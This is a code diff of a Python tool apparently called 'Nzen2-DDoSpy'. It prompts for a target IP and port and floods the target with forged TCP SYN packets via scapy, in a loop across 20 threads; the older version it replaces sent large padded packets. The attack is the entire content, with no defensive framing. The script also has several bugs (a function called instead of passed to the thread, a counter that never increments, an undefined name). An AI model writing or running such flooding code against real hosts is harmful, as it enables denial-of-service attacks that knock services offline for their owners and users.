@@ -3,19 +3,13 @@
 #Imports:
 import os
 import sys
-import subprocess
-import asyncio
 from platform import platform
 from os import listdir
 os.system('pip3 install scapy')
 from scapy.all import *
 import threading
-
-
-
-
-version = 'v Alpha 0.1'
-
+version = 'v Alpha 0.2'
+packets_sent = 0
 # Change version in var
 
 title = '''
@@ -60,27 +54,16 @@ logoascii = '''
              '''
 
 
-
-
-# Function for Main Screen, (mainscr) for easy access.
-
+# Functioan for Main Screen, (mainscr) for easy access.
 def mainscr():
 
     os.system("cls")
     print(title)
 
     os.system("pause")
-
 mainscr()
-
-
-
 os.system("cls")
-
-
 sc2 = '''
-
-
     Enter the destination IP Address:
     then,
     Enter the port:
@@ -92,13 +75,7 @@ sc2 = '''
       (Localhost is the Local IP)
       (Port 80 is the most common ICP, HTTP. )
 
-
        '''
-
-
-
-
-
 # Function for Second Screen, (secondscr) for easy access.
 def secondscr():
     os.system('cls')
@@ -107,59 +84,40 @@ def secondscr():
 
     print(logoascii)
 
-
 print(secondscr())
-
-
-
-
-
-
 
 target_ip = input("IP:")
 target_port = input("Port:")
 
+def info():
+    destip = target_ip
+    destport = target_port
+    orginip = socket.gethostbyname(localhost)
 
+    print('''
+Nzen2-DDoSpy Info screen:
 
+Attack type: TCP flood
+    Sender IP: '''+orginip+'''
+    Destination IP: '''+destip+'''
+    Destination Port: '''+destport+'''
 
+    Packets sent: '''+packets_sent+'''
 
-def DoS_synflood():
-    # forge IP packet with target ip as the destination IP address
+            ''')
 
-    ip = IP(dst=target_ip)
-
-    # forge a TCP SYN packet with a random source port
-    # and the target port as the destination port
-
-    tcp = TCP(sport=RandShort(), dport=int(target_port), flags="S")
-
-    # add some flooding data 
-    raw = Raw(b"X"*65000)
-
-    # stack up the layers
-    p = ip / tcp / raw
-
-    # send the constructed packet in a loop until CTRL+C is detected
-    send(p, loop=1)
-
-
-
-
-
-
-
-
-
-
-
+def attack():
+    while True:
+        p = IP(dst= target_ip) / TCP(flags="S",  sport=RandShort(),  dport=int(target_port))
+        send(p , verbose=0, loop=0)
+        packets_sent + 1
 
 os.system('pause')
 
-#_thread.start_new_thread(DoS_synflood())
-
-
-threading.Thread(target=DoS_synflood()).start()
-
+for i in range(0,20):
+    Thread = threading.Thread(target=attack())
+    Thread.start()
+info()
 
 
 input("Press Enter to exit:")
